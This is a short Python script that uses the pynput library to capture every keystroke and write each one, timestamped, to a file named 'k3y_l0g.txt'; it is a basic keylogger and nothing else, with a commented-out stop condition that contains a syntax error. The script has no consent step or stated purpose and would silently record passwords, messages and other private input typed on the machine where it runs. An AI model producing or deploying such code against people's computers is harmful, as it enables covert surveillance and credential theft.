from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "k3y_l0g.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
	logging.info(str(key))
	#if key = Key.esc:
		# Stop listner
		#return False

#this says, listener is on
with Listener(on_press=on_press) as listener:
	listener.join()
